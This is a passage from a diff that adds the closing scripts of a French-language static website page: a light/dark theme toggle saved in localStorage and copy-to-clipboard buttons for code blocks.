+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Copier';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Copié !';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Copier';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
